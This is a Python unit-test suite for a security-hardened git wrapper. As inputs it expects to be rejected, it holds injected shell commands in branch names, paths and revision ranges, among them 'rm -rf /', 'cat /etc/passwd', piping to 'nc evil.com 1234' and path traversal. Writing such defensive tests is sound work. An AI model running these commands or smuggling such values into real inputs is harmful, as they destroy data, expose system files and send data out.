#!/usr/bin/env python3
"""
Test Suite for Secure Git Operations

Comprehensive tests for the security-hardened git operations module.
"""

import unittest
import tempfile
import shutil
import os
from pathlib import Path
import subprocess
from unittest.mock import Mock, patch, MagicMock

# Add the scripts directory to the path
import sys
sys.path.insert(0, str(Path(__file__).parent.parent / "scripts"))

from secure_git_operations import (
    SecureGitOperations, 
    GitOperationError, 
    SecurityError, 
    GitConfig,
    validate_git_environment
)

class TestSecureGitOperations(unittest.TestCase):
    """Test cases for SecureGitOperations"""
    
    def setUp(self):
        """Set up test environment"""
        self.test_dir = tempfile.mkdtemp()
        self.repo_path = Path(self.test_dir) / "test_repo"
        self.repo_path.mkdir()
        
        # Initialize a git repository
        subprocess.run(["git", "init"], cwd=self.repo_path, capture_output=True)
        subprocess.run(["git", "config", "user.email", "test@example.com"], cwd=self.repo_path, capture_output=True)
        subprocess.run(["git", "config", "user.name", "Test User"], cwd=self.repo_path, capture_output=True)
        
        # Create initial commit
        test_file = self.repo_path / "test.txt"
        test_file.write_text("Initial content")
        subprocess.run(["git", "add", "test.txt"], cwd=self.repo_path, capture_output=True)
        subprocess.run(["git", "commit", "-m", "Initial commit"], cwd=self.repo_path, capture_output=True)
    
    def tearDown(self):
        """Clean up test environment"""
        shutil.rmtree(self.test_dir)
    
    def test_initialization_valid_repo(self):
        """Test initialization with valid repository"""
        git_ops = SecureGitOperations(self.repo_path)
        self.assertEqual(str(git_ops.repo_path), str(self.repo_path.resolve()))
        self.assertIsInstance(git_ops.config, GitConfig)
    
    def test_initialization_invalid_repo(self):
        """Test initialization with invalid repository"""
        invalid_path = Path(self.test_dir) / "invalid"
        with self.assertRaises(GitOperationError):
            SecureGitOperations(invalid_path)
    
    def test_initialization_non_git_repo(self):
        """Test initialization with non-git directory"""
        non_git_path = Path(self.test_dir) / "non_git"
        non_git_path.mkdir()
        
        with self.assertRaises(GitOperationError):
            SecureGitOperations(non_git_path)
    
    def test_path_validation_safe_path(self):
        """Test path validation with safe path"""
        # Should not raise exception
        git_ops = SecureGitOperations(self.repo_path)
        self.assertTrue(git_ops.repo_path.is_absolute())
    
    def test_path_validation_unsafe_path(self):
        """Test path validation with unsafe path"""
        # Create a mock path with dangerous characters
        with patch.object(Path, 'resolve', return_value=Path("/tmp/../etc/passwd")):
            with patch.object(Path, 'exists', return_value=False):
                with self.assertRaises(GitOperationError):  # Should fail on non-existent path
                    SecureGitOperations(self.repo_path)
    
    def test_command_validation_valid_command(self):
        """Test git command validation with valid commands"""
        git_ops = SecureGitOperations(self.repo_path)
        
        valid_commands = ['status', 'log', 'diff', 'branch']
        for cmd in valid_commands:
            result = git_ops._validate_git_command(cmd)
            self.assertEqual(result, cmd)
    
    def test_command_validation_invalid_command(self):
        """Test git command validation with invalid commands"""
        git_ops = SecureGitOperations(self.repo_path)
        
        invalid_commands = ['rm', 'delete', 'format', 'daemon']
        for cmd in invalid_commands:
            with self.assertRaises(SecurityError):
                git_ops._validate_git_command(cmd)
    
    def test_command_validation_malicious_command(self):
        """Test git command validation with malicious commands"""
        git_ops = SecureGitOperations(self.repo_path)
        
        malicious_commands = ['status; rm -rf /', 'log && cat /etc/passwd', 'diff | nc']
        for cmd in malicious_commands:
            with self.assertRaises(SecurityError):
                git_ops._validate_git_command(cmd)
    
    def test_args_validation_valid_args(self):
        """Test argument validation with valid arguments"""
        git_ops = SecureGitOperations(self.repo_path)
        
        valid_args = ['--oneline', 'main', 'HEAD~1', 'refs/heads/main']
        result = git_ops._validate_git_args(valid_args)
        self.assertEqual(result, valid_args)
    
    def test_args_validation_invalid_args(self):
        """Test argument validation with invalid arguments"""
        git_ops = SecureGitOperations(self.repo_path)
        
        invalid_args = ['--oneline; rm -rf /', 'main && echo pwned', 'HEAD~1 | nc', 'refs/heads/malicious; rm -rf /']
        for arg in invalid_args:
            with self.assertRaises(SecurityError):
                git_ops._validate_git_args([arg])
    
    def test_get_branch_info(self):
        """Test getting branch information"""
        git_ops = SecureGitOperations(self.repo_path)
        
        # Create a test branch
        subprocess.run(["git", "checkout", "-b", "test-branch"], cwd=self.repo_path, capture_output=True)
        subprocess.run(["git", "checkout", "main"], cwd=self.repo_path, capture_output=True)
        
        branch_info = git_ops.get_branch_info()
        self.assertIsInstance(branch_info, list)
        self.assertTrue(len(branch_info) >= 1)
        
        # Check structure
        for branch in branch_info:
            self.assertIn('name', branch)
            self.assertIn('last_commit', branch)
            self.assertIn('subject', branch)
    
    def test_get_branch_info_malicious_format(self):
        """Test branch info with malicious format string"""
        git_ops = SecureGitOperations(self.repo_path)
        
        malicious_formats = [
            "%(refname:short); rm -rf /",
            "%(refname:short) && cat /etc/passwd",
            "%(refname:short) | nc evil.com 1234"
        ]
        
        for fmt in malicious_formats:
            with self.assertRaises(SecurityError):
                git_ops.get_branch_info(fmt)
    
    def test_get_commit_count(self):
        """Test getting commit count"""
        git_ops = SecureGitOperations(self.repo_path)
        
        # Create commits
        for i in range(3):
            test_file = self.repo_path / f"test{i}.txt"
            test_file.write_text(f"Content {i}")
            subprocess.run(["git", "add", f"test{i}.txt"], cwd=self.repo_path, capture_output=True)
            subprocess.run(["git", "commit", "-m", f"Commit {i}"], cwd=self.repo_path, capture_output=True)
        
        # Create branch
        subprocess.run(["git", "checkout", "-b", "test-branch"], cwd=self.repo_path, capture_output=True)
        subprocess.run(["git", "checkout", "main"], cwd=self.repo_path, capture_output=True)
        
        count = git_ops.get_commit_count("test-branch..main")
        self.assertIsInstance(count, int)
        self.assertGreaterEqual(count, 0)
    
    def test_get_commit_count_malicious_range(self):
        """Test commit count with malicious revision range"""
        git_ops = SecureGitOperations(self.repo_path)
        
        malicious_ranges = [
            "main..test; rm -rf /",
            "main..test && cat /etc/passwd",
            "main..test | nc evil.com 1234"
        ]
        
        for range_str in malicious_ranges:
            with self.assertRaises(SecurityError):
                git_ops.get_commit_count(range_str)
    
    def test_get_file_content(self):
        """Test getting file content from branch"""
        git_ops = SecureGitOperations(self.repo_path)
        
        content = git_ops.get_file_content("main", "test.txt")
        self.assertEqual(content, "Initial content")
    
    def test_get_file_content_nonexistent(self):
        """Test getting content of nonexistent file"""
        git_ops = SecureGitOperations(self.repo_path)
        
        content = git_ops.get_file_content("main", "nonexistent.txt")
        self.assertIsNone(content)
    
    def test_get_file_content_malicious_path(self):
        """Test getting file content with malicious path"""
        git_ops = SecureGitOperations(self.repo_path)
        
        malicious_paths = [
            "../../../etc/passwd",
            "/etc/passwd",
            "test.txt; rm -rf /",
            "test.txt && cat /etc/passwd"
        ]
        
        for path in malicious_paths:
            with self.assertRaises(SecurityError):
                git_ops.get_file_content("main", path)
    
    def test_get_file_content_malicious_branch(self):
        """Test getting file content with malicious branch name"""
        git_ops = SecureGitOperations(self.repo_path)
        
        malicious_branches = [
            "main; rm -rf /",
            "main && cat /etc/passwd",
            "main | nc evil.com 1234"
        ]
        
        for branch in malicious_branches:
            with self.assertRaises(SecurityError):
                git_ops.get_file_content(branch, "test.txt")
    
    def test_checkout_branch(self):
        """Test checking out a branch"""
        git_ops = SecureGitOperations(self.repo_path)
        
        # Create test branch
        subprocess.run(["git", "checkout", "-b", "test-branch"], cwd=self.repo_path, capture_output=True)
        subprocess.run(["git", "checkout", "main"], cwd=self.repo_path, capture_output=True)
        
        result = git_ops.checkout_branch("test-branch")
        self.assertTrue(result)
        
        # Verify current branch
        current = git_ops.get_current_branch()
        self.assertEqual(current, "test-branch")
    
    def test_checkout_branch_malicious(self):
        """Test checking out with malicious branch name"""
        git_ops = SecureGitOperations(self.repo_path)
        
        malicious_branches = [
            "main; rm -rf /",
            "main && cat /etc/passwd",
            "main | nc evil.com 1234"
        ]
        
        for branch in malicious_branches:
            with self.assertRaises(SecurityError):
                git_ops.checkout_branch(branch)
    
    def test_add_file(self):
        """Test adding file to git index"""
        git_ops = SecureGitOperations(self.repo_path)
        
        # Create test file
        test_file = self.repo_path / "new_test.txt"
        test_file.write_text("New content")
        
        result = git_ops.add_file("new_test.txt")
        self.assertTrue(result)
    
    def test_add_file_malicious_path(self):
        """Test adding file with malicious path"""
        git_ops = SecureGitOperations(self.repo_path)
        
        malicious_paths = [
            "../../../etc/passwd",
            "/etc/passwd",
            "test.txt; rm -rf /",
            "test.txt && cat /etc/passwd"
        ]
        
        for path in malicious_paths:
            with self.assertRaises(SecurityError):
                git_ops.add_file(path)
    
    def test_commit_changes(self):
        """Test committing changes"""
        git_ops = SecureGitOperations(self.repo_path)
        
        # Create and add test file
        test_file = self.repo_path / "commit_test.txt"
        test_file.write_text("Commit test content")
        git_ops.add_file("commit_test.txt")
        
        result = git_ops.commit_changes("Test commit message")
        self.assertTrue(result)
    
    def test_commit_changes_malicious_message(self):
        """Test committing with malicious message"""
        git_ops = SecureGitOperations(self.repo_path)
        
        # Create and add test file
        test_file = self.repo_path / "commit_test.txt"
        test_file.write_text("Commit test content")
        git_ops.add_file("commit_test.txt")
        
        # Malicious message should be sanitized, not raise exception
        result = git_ops.commit_changes("Test commit rm -rf /")  # Remove semicolon
        self.assertTrue(result)
    
    def test_commit_changes_no_changes(self):
        """Test committing when no changes"""
        git_ops = SecureGitOperations(self.repo_path)
        
        result = git_ops.commit_changes("No changes commit")
        self.assertFalse(result)
    
    def test_get_status(self):
        """Test getting git status"""
        git_ops = SecureGitOperations(self.repo_path)
        
        status = git_ops.get_status()
        self.assertIsInstance(status, str)
        
        # Create untracked file
        test_file = self.repo_path / "untracked.txt"
        test_file.write_text("Untracked content")
        
        status = git_ops.get_status()
        self.assertIn("untracked.txt", status)
    
    @patch('subprocess.run')
    def test_execute_command_timeout(self, mock_run):
        """Test command execution with timeout"""
        mock_run.side_effect = subprocess.TimeoutExpired(cmd=['git', 'status'], timeout=5)
        
        git_ops = SecureGitOperations(self.repo_path)
        
        with self.assertRaises(GitOperationError):
            git_ops.get_status()
    
    @patch('subprocess.run')
    def test_execute_command_failure(self, mock_run):
        """Test command execution with failure"""
        mock_result = Mock()
        mock_result.returncode = 1
        mock_result.stderr = "Command failed"
        mock_run.return_value = mock_result
        
        git_ops = SecureGitOperations(self.repo_path)
        
        with self.assertRaises(GitOperationError):
            git_ops.get_commit_count("invalid..range")


class TestGitConfig(unittest.TestCase):
    """Test cases for GitConfig"""
    
    def test_default_config(self):
        """Test default configuration"""
        config = GitConfig()
        self.assertEqual(config.timeout, 30)
        self.assertEqual(config.max_retries, 3)
        self.assertTrue(config.safe_mode)
        self.assertIsInstance(config.allowed_commands, list)
        self.assertIn('status', config.allowed_commands)
    
    def test_custom_config(self):
        """Test custom configuration"""
        config = GitConfig(
            timeout=60,
            max_retries=5,
            safe_mode=False,
            allowed_commands=['status', 'log']
        )
        self.assertEqual(config.timeout, 60)
        self.assertEqual(config.max_retries, 5)
        self.assertFalse(config.safe_mode)
        self.assertEqual(config.allowed_commands, ['status', 'log'])


class TestValidateGitEnvironment(unittest.TestCase):
    """Test cases for git environment validation"""
    
    @patch('subprocess.run')
    def test_validate_git_environment_success(self, mock_run):
        """Test successful git environment validation"""
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "git version 2.34.1"
        mock_run.return_value = mock_result
        
        result = validate_git_environment()
        self.assertEqual(result['status'], 'success')
        self.assertIn('git_version', result)
        self.assertEqual(result['security_mode'], 'enabled')
    
    @patch('subprocess.run')
    def test_validate_git_environment_failure(self, mock_run):
        """Test failed git environment validation"""
        mock_result = Mock()
        mock_result.returncode = 1
        mock_run.return_value = mock_result
        
        result = validate_git_environment()
        self.assertEqual(result['status'], 'error')
        self.assertIn('message', result)
    
    @patch('subprocess.run')
    def test_validate_git_environment_timeout(self, mock_run):
        """Test git environment validation with timeout"""
        mock_run.side_effect = subprocess.TimeoutExpired(cmd=['git', '--version'], timeout=5)
        
        result = validate_git_environment()
        self.assertEqual(result['status'], 'error')
        self.assertIn('message', result)


if __name__ == '__main__':
    # Run the tests
    unittest.main(verbosity=2)